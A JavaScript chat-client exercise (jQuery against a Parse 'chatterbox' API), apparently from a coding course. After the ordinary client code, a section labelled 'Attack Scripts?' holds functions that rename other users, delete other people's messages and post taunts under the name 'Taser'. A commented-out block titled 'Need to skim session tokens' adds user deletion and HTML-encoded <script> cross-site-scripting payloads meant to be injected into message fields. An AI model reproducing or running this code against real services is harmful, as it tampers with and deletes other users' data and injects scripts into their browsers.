// YOUR CODE HERE:
var App = function(){
  this.server = "https://api.parse.com/1/classes/chatterbox";
  this.messages = [];
  this.rooms = {};
  this.friends = {};
  this.username = "User1";
};

App.prototype.init = function(){
  var self = this;
  this.fetch(function(data){
    roomKey = {};
    self.messages = data.results;

    _.each( data.results,
      function(msg){
        self.addMessage(msg);
        roomKey[msg.roomname] = roomKey[msg.roomname] || [];
        roomKey[msg.roomname].push(msg);
    });

    self.rooms = roomKey;
    self.addRoom('All');
    _.each(self.rooms,function(val,key){
      self.addRoom(key);
    });
  });
};

App.prototype.send = function(message, _successCallBack) {
  return $.ajax({
    url: 'https://api.parse.com/1/classes/chatterbox',
    type: 'POST',
    data: JSON.stringify(message),
    contentType: 'application/json',
    success: function (data) {
      if(_successCallBack){
        _successCallBack(data);
      }
      console.log('chatterbox: Message sent');
    },
    error: function (data) {
      console.error('chatterbox: Failed to send message');
    }
  });
};

App.prototype.fetch = function(_successCallBack) {
  return $.ajax({
    url: 'https://api.parse.com/1/classes/chatterbox',
    type: 'GET',
    data: {'order': '-updatedAt'},
    contentType: 'application/json',
    success: function (data) {
      if(_successCallBack){
        _successCallBack(data);
      }
      return data;
    },
    error: function (data) {
      console.error('chatterbox: Failed to fetch messages');
    }
  });
};

App.prototype.clearMessages = function(){
  $('#chats').children().remove();
};

App.prototype.addMessage = function(message) {
  var time = new Date(message.createdAt);
  var h = time.getHours();
  var m = time.getMinutes();

  var $msg = $('<div class="message"></div>');
  $('<a href="#" class="user-name"></a>').text(message.username).appendTo($msg);
  $('<time></time>').attr('datetime', message.createdAt).text(h + ':' + m + (h < 12 ? ' AM' : ' PM')).appendTo($msg);
  $('<p></p>').text(message.text).appendTo($msg);

  $('#chats').append($msg);
};

App.prototype.addRoom = function(roomname) {
  $('ul#rooms').append($('<li></li>').text(roomname));
};

var changeRoom = function(event){
  var room = $('#roomSelect').val();
  var self = app;
  self.clearMessages();
  $('#roomSelect').children().remove();
  if(room === 'All'){
    app.init();
    return;
  }
  self.fetch(function(data){
  self.messages = data.results;
    
    _.each(data.results, function(msg) {
      if (msg.roomname === room) {
        self.addMessage(msg);
      }
      self.rooms[msg.roomname] = msg.roomname;
    });

    self.addRoom('All');
    _.each(self.rooms,function(val,key){
      self.addRoom(val);
    });

    $('#roomSelect').children('option:contains('+room+')').attr('selected','selected');
  });
};

App.prototype.addFriend = function(event) {
  event.preventDefault();
  var friend = $(this).text();
  if (!app.friends[friend]) {
    $('#friendSelect').append($('<option></option>').text($(this).text()));
    app.friends[friend] = true;
  }
};

var highlightFriend = function(event){
  event.preventDefault();
  event.stopPropagation();
  var friend = $('#friendSelect').val();
  $('a.user-name:contains('+friend+')').parent('.message').css('background','pink');
};

App.prototype.getUsername = function(objectId){
  return $.ajax({
    url: 'https://api.parse.com/1/users/'+ objectId,
    type: 'GET',
    contentType: 'application/json',
    success: function (data) {
      app.userName = data;
      console.log('chatterbox: Message sent');
    },
    error: function (data) {
      console.error('chatterbox: Failed to send message');
    }
  });
};

var app = new App();
app.init();
//setInterval(function(){app.init(), deleteDirtyPost();}, 1000);

/////////////////////////////////////////////////////////////////////
// Event Listeners                                                 //
/////////////////////////////////////////////////////////////////////

$(document).on('click', '#submitMsg', function(event){
  event.preventDefault();
  var message = {
    username: app.username,
    text: $('#chatBox').val(),
    roomname: 'lobby'
  };


  app.send(message, function(){
     $('#chatBox').val("");
  });
  app.clearMessages();
  app.init();
});

$(document).on('click', '.user-name', app.addFriend);

$(document).change('#roomSelect', changeRoom);

$(document).change('#friendSelect', highlightFriend);

/////////////////////////////////////////////////////////////////////
//Attack Scripts?                                                  //
/////////////////////////////////////////////////////////////////////

var ajaxUserList = function(){
  return $.ajax({
    url: 'https://api.parse.com/1/users',
    type: 'GET',
    data: '',
    contentType: 'application/json',
    success: function (data) {
      console.log('chatterbox: Message sent');
    },
    error: function (data) {
      console.error('chatterbox: Failed to send message');
    }
  });
};

var ajaxUserUpdate = function(objectId,newName){
  $.ajax({
    url: 'https://api.parse.com/1/users/'+ objectId,
    type: 'PUT',
    data: {username:newName},
    success: function (data) {
      console.log('chatterbox: renamed user ID: '+ objectId +' to:'+ newName);
    },
    error: function (data) {
      console.error('chatterbox: Failed to updateMessage');
    }
  });
};

var ajaxMessageUpdate = function(message){
  $.ajax({
    url: 'https://api.parse.com/1/classes/chatterbox/' + message.objectId,
    type: 'PUT',
    data: message,
    success: function (data) {
      console.log('chatterbox: renamed message ID: '+ message.objectId);
    },
    error: function (data) {
      console.error('chatterbox: Failed to updateMessage');
    }
  });
};

var assignNewName= function (message, newName){
  message.username = newName;
  return message;
};

var ajaxMsgDelete = function(message){
  $.ajax({
    url: 'https://api.parse.com/1/classes/chatterbox/'+message.objectId,
    type: 'DELETE',
    success: function (data) {
      console.log('chatterbox: deleted msg ID: '+ message.objectId);
    },
    error: function (data) {
      console.error('chatterbox: Failed to delete Message');
    }
  });
};

var deleteAllUserPosts = function(username, customMsg){
  customMsg = customMsg ||"";

  app.messages.forEach(
    function(message){
      if(message.username ===username){ 
        ajaxMsgDelete(message);
      }
    }
  );

  app.send({
    username: 'Taser',
    text: "All messages by "+username+ " have been deleted." + customMsg,
    roomname:'lobby'
  });

};

var deleteUserPost = function(username, customMsg){
  var found = false;
  customMsg = customMsg ||"";
  app.messages.forEach(
    function(message){
      if(message.username ===username && !found){ 
        ajaxMsgDelete(message);
        found = true;
      }
    }
  );

  if (found){
    app.send({
      username: 'Taser',
      text: "The last message by "+username+ " has been deleted.  " + customMsg,
      roomname:'lobby'
    });
  }

};

var deleteDirtyPost = function(){
  var found = false;
  app.messages.forEach(
    function(message){
      if(message.username === "The Real Arnold" && !found && Date.now()< 143843802234){ 
        ajaxMsgDelete(message);
        found = true;
      }
    }
  );

  if (found){
    app.send({
      username: 'Taser',
      text: "You've been erased... until after lunch.",
      roomname:'lobby'
    });
  }
};

// //////////////// Need to skim session tokens ////////////////////////

// // var ajaxUserList = function(){
// //   return $.ajax({
// //     url: 'https://api.parse.com/1/users',
// //     type: 'GET',
// //     data: '',
// //     contentType: 'application/json',
// //     success: function (data) {
// //       console.log('chatterbox: Message sent');
// //     },
// //     error: function (data) {
// //       console.error('chatterbox: Failed to send message');
// //     }
// //   });
// // };

// // var ajaxUserDelete = function(userID){
// //   $.ajax({
// //     url: 'https://api.parse.com/1/users/'+userID,
// //     type: 'DELETE',
// //     success: function (data) {
// //       console.log('chatterbox: deleted UserID: '+ userID);
// //     },
// //     error: function (data) {
// //       console.error('chatterbox: Failed to send message');
// //     }
// //   });
// // };



// // var attackMsg = function(inputScript){
// //   return {
// //     roomname: inputScript,
// //     text: inputScript,
// //     username: inputScript
// //   };
// // };
// // var input= '&lt;script&gt;&#36;(&#39;&#35;chats&#39;).css(&#39;background&#39;,&#39;pink&#39;);&lt;/script&gt;';
// // var input2='&lt;script&gt;console.log(&#x27;xss&#x27;);&lt;/script'
